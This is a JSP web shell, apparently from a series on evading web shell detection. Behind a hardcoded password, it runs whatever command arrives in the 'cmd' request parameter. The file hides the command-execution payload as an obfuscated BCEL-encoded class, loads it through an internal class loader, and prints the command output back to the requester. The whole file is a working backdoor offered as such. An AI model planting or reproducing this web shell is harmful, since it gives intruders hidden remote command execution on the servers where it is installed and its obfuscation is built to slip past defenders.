<%@ page language="java" pageEncoding="UTF-8" %>
<%! String PASSWORD = "123456"; %>
<%
    String cmd = request.getParameter("cmd");
    String pwd = request.getParameter("pwd");
    if (!pwd.equals(PASSWORD)) {
        return;
    }
    // 0x01中ByteCodeEvil生成的字节码
    String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bO$TA$U$fe$a6$5d$3aeY$u$z$b7$e2$5d$U$v$a5$b0$5e$f0F$R$b4$I$88$W0$600$7d$dcn$H$5clw$9b$ed$96$e0$_$f2U$Tm$8d$q$3e$fa$e0$a3$3f$c3$df$60$c43$dbri$a81$cd$9e$99s$99s$be$f3$cd$99$fe$f8$f3$f5$h$80i$ac$a9$88$o$c51$a9$o$m$d7$v$O$5d$c5M$dc$92$e2$b6$8a$3b$98V$d1$81$bb$w$U$dc$93$e2$be$M$7c$Q$c6C$b9$cet$a2$Xi$8eY$8eG$MAWT$Yb$d9$5dc$cf$d0$8b$86$bd$a3oz$aee$ef$a4$ZB$b3$96mys$M$D$89$b3$ee$f1$z$Ge$c1$v$I$86H$d6$b2$c5Z$b5$94$X$ee$x$p_$U2$9dc$g$c5$z$c3$b5$a4$de4$w$de$h$8bJ$NeM$a7$a4$_$eeYE$3d$f3$ce$T2$85T$a8$5e$d0$y$V$Y$ba$x$7e$81L$d5$w$W$84$cb0$7c$a6v$d3E$tz$f2$d5$edm$e1$8a$c2$860$fc$e0x$p$d8r$f4L$8b$87b$95$o$a1$a4$f4$9b$9ea$be$5d5$ca$3e$w$9f$859b$92HdP$X$f7MQ$f6$y$c7$aep$cc3$84$3d$a7Q$91$a1$3f1$de$8e$ou$d3$a9$ba$a6X$b2d$83$d1$d3$fdL$c9h$N$fdxL$z$ff$a3$D$86$c1$f6p$a9$eb$p$c7$8a$5d$aeztJ$Y$a5$86$8f$e3$89$86$M$W4$3c$c5$o$c7$92$86e$3c$93$85V$a4x$ae$e1$F$c65d$b1$ca$c0T$N$J$a9$c5$d0G$b7$d8$96w$86$de$Tt$eb$f9$5daz$z$a6$p$C$fa$8e$B$ad$l$b3DW$96$90s$Q$3d$J$df$a8$da$9eU$o2$d4$j$e1$j$x$D$z$ec5$cd$f2N$c4$be0$Z$c6$da$cd$d7$v$d3K$d71E$a5$92n$a9$d44$d2$QP$a5S$y$R$ddG$d5Z$e9$a3$e3$f1D$5b$87$ec$a1$ef$c4$d5$i$Zi$N$93$bf$90$f5$H$td$94$cb$c2$a6$B$9d$fc$P$da$d6$n$c5UzmQz$b6$8c$3e$ba$H$92$B$da$f7c$80$d6A$d2$7e$oDo$VXN$d6$c1$O$Q$c8$d5$R$5c$3d$80$92$3b$40G$ee$LB$T5$f0$g$c2ut$d6$a1$aeM$d6$d0$95$9bQ$be$p$96$gVj$d0b$dd$q$5e$bf$3f$fc$95L$d5$d0$f3$Z$91$8f$94$w$88$n$92$97$c0Iv$d2$f3$ef$82F$bfQ$f4$40G$Es$Eg$89$a0$c4$fd$ff$S$bf4$86q$O$f0w$e7$J$o$a3$e84$$$e0$oA$i$c5$Ie$baL9S$e4$bbB$5e$85Z$C$ed$D$87$e4T8F8$aeq$5c$e7$a4$e17$e2$a4$e1$G$F$u$94f$8c$3e$g$40$92$b2S$9dV$c9BG$f2$T$o$l$7c$o$q$ce$90o$i$f2$f1h$8d$80$s$k$86$a4$l5$f1$X$9c5$85$b0$fa$E$A$A\n";
    // new ClassLoader().loadClass(bcelCode).newInstance(cmd);
    Class<?> c = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
    ClassLoader loader = (ClassLoader) c.newInstance();
    Class<?> clazz = loader.loadClass(bcelCode);
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);
    // 回显
    response.getWriter().print("<pre>");
    response.getWriter().print(obj.toString());
    response.getWriter().print("</pre>");
%>